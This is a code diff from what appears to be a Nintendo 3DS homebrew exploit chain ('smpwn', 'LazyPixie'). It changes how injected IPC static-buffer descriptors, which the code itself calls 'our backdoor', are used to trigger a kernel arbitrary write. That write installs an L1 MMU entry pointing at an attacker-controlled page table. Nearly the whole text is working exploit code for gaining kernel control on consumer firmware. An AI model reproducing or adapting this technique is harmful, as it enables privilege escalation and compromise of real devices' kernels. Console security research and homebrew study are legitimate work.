@@ -256,27 +256,8 @@ Result smpwn(Handle *outSrvHandle, SmpwnContext *ctx)
         IPC_Desc_StaticBuffer(0x110, 0), // Original static buffer for srv:pm RegisterProcess
         s_constants.staticBuffer0Addr,
 
-        IPC_Desc_StaticBuffer(16*8, 1),
-        staticBufsAddr, // our backdoor
-
-        IPC_Desc_StaticBuffer(0, 2),
-        0, // empty
-
-        // Here we create a MMU entry, L1 entry mapping a page table (client will set bits 1 and 0 accordingly),
-        // to map MAP_ADDR.
-        // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
-
-        IPC_Desc_StaticBuffer(0, 3),
-        KERNPA2VA(0x1FFF8000) + (KHC3DS_MAP_ADDR >> 20) * 4,
-
-        IPC_Desc_StaticBuffer(0, 4),
-        KERNPA2VA(0x1FFFC000) + (KHC3DS_MAP_ADDR >> 20) * 4,
-
-        IPC_Desc_StaticBuffer(0, 5),
-        KERNPA2VA(0x1F3F8000) + (KHC3DS_MAP_ADDR >> 20) * 4,
-
-        IPC_Desc_StaticBuffer(0, 6),
-        KERNPA2VA(0x1F3FC000) + (KHC3DS_MAP_ADDR >> 20) * 4,
+        IPC_Desc_StaticBuffer((16 - 2)*8, 1),
+        staticBufsAddr + 2*8, // our backdoor
     };
 
     smWriteStaticBufferData(ctx, staticBufs, sizeof(staticBufs), 0);
@@ -295,17 +276,12 @@ u32 smGetInitialServiceCount(const SmpwnContext *ctx)
 Result smWriteData(const SmpwnContext *ctx, u32 smDst, const void *src, size_t size)
 {
     Result res = 0;
-    u32 staticBufs[16*2] = {
-        IPC_Desc_StaticBuffer(0x110, 0), // Original static buffer for srv:pm RegisterProcess
-        s_constants.staticBuffer0Addr,
-        IPC_Desc_StaticBuffer(16*8, 1),
-        s_constants.tlsAddr + 0x180, // our backdoor
+    u32 tmpStaticBufs[] = {
         IPC_Desc_StaticBuffer(size, 2),
         smDst,
-        // LazyPixie staticbufs not overwritten
     };
 
-    TRY(smWriteStaticBufferData(ctx, staticBufs, sizeof(staticBufs), 1));
+    TRY(smWriteStaticBufferData(ctx, tmpStaticBufs, sizeof(tmpStaticBufs), 1)); // write at tls + 0x180 + 0x10
     TRY(smWriteStaticBufferData(ctx, src, size, 2));
 
     return res;
@@ -332,22 +308,35 @@ Result smRemoveRestrictions(const SmpwnContext *ctx)
     return res;
 }
 
+
 Result smMapL2TableViaLazyPixie(const SmpwnContext *ctx, const BlobLayout *layout)
 {
     Result res = 0;
     u32 *cmdbuf = getThreadCommandBuffer();
-    u32 baseSbufId = 3;
 
-    // We assume our static buffers descriptors have already been injected
     // Trigger the kernel arbwrite
-    u32 numCores = IS_N3DS ? 4 : 2;
-    cmdbuf[0] = IPC_MakeHeader(0xCAFE, 0, 2 * numCores);
-    for (u32 i = 0; i < numCores; i++) {
-        cmdbuf[1 + 2 * i]       = IPC_Desc_PXIBuffer(4, baseSbufId + i, false);
-        cmdbuf[1 + 2 * i + 1]   = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
-    }
 
-    TRY(svcSendSyncRequest(ctx->srvHandle));
+    for (u32 i = 0; i < 2; i++) {
+        static const u32 l1TableAddrs[] = { 0x1FFF8000, 0x1FFFC000, 0x1F3F8000, 0x1F3FC000 };
+        u32 tmpStaticBufs[] = {
+            // Here we create a MMU entry, L1 entry mapping a page table (client will set bits 1 and 0 accordingly),
+            // to map MAP_ADDR.
+            // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash.
+
+            // The problem is that address translation is still done OOB (only 0x1000 bytes are allocated for TTB0),
+            // if it walk through an entry with bit0 it'll likely crash. So here, we only map for core0 and core1.
+            IPC_Desc_StaticBuffer(0, 2),
+            KERNPA2VA(l1TableAddrs[i]) + (KHC3DS_MAP_ADDR >> 20) * 4,
+        };
+
+        TRY(smWriteStaticBufferData(ctx, tmpStaticBufs, sizeof(tmpStaticBufs), 1)); // write at tls + 0x180 + 0x10
+
+        cmdbuf[0] = IPC_MakeHeader(0xCAFE, 0, 2);
+        cmdbuf[1] = IPC_Desc_PXIBuffer(4, 2, false);
+        cmdbuf[2] = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
+
+        TRY(svcSendSyncRequest(ctx->srvHandle));
+    }
 
     return res;
 }
